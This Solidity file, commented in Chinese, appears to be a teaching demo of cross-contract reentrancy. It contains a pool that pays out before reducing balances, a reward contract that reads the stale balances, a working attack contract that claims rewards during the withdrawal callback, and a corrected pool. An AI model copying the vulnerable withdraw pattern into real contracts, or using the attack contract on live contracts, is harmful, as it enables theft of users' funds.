// SPDX-License-Identifier: MIT
pragma solidity 0.8.20;

/// @title TokenPool
/// @notice 代币池 — nonReentrant 只保护自身，withdraw 先转账后扣减
contract TokenPool {
    mapping(address => uint256) public shares;
    uint256 public totalShares;

    function deposit() external payable {
        shares[msg.sender] += msg.value;
        totalShares += msg.value;
    }

    function withdraw(uint256 amt) external {
        require(shares[msg.sender] >= amt);

        // 先转账 → receive() 被触发
        // slither-disable-next-line reentrancy-eth -- intentional: demo of cross-contract reentrancy
        (bool ok,) = msg.sender.call{value: amt}("");
        require(ok);

        // 后扣减 — 状态中间态在这里
        shares[msg.sender] -= amt;
        totalShares -= amt;
    }
}

/// @title RewardDistributor
/// @notice 奖励合约 — 读取 TokenPool.shares，不知道 TokenPool 正处于中间态
/// @dev 使用 1:1 奖励（1 share = 1 wei reward），无 claimed 以便演示跨合约重入
contract RewardDistributor {
    TokenPool public pool;

    constructor(address _pool) payable {
        pool = TokenPool(payable(_pool));
    }

    receive() external payable {}

    function claimReward() external {
        uint256 userShares = pool.shares(msg.sender);
        uint256 reward = userShares; // 1:1 reward
        require(reward > 0, "nothing to claim");
        require(address(this).balance >= reward, "insufficient");

        payable(msg.sender).transfer(reward);
    }
}

/// @title CrossContractAttack
/// @notice 跨合约重入：receive 时 shares 未扣减，RewardDistributor 读到旧份额
contract CrossContractAttack {
    TokenPool public pool;
    RewardDistributor public distributor;
    bool private attacked;

    constructor(address _p, address _d) {
        pool = TokenPool(payable(_p));
        distributor = RewardDistributor(payable(_d));
    }

    function attack() external payable {
        pool.deposit{value: 10 ether}();
        pool.withdraw(10 ether);
    }

    receive() external payable {
        if (!attacked) {
            attacked = true;
            // 此时 TokenPool 已转出 10 ETH，但 shares[attacker] 还没扣减
            // RewardDistributor 读到旧份额，可领取奖励
            distributor.claimReward();
        }
    }
}

/// @title SafeTokenPool
/// @notice 修复：先扣减再转账
contract SafeTokenPool {
    mapping(address => uint256) public shares;
    uint256 public totalShares;

    function deposit() external payable {
        shares[msg.sender] += msg.value;
        totalShares += msg.value;
    }

    function withdraw(uint256 amt) external {
        require(shares[msg.sender] >= amt);
        shares[msg.sender] -= amt;
        totalShares -= amt;
        (bool ok,) = msg.sender.call{value: amt}("");
        require(ok);
    }
}
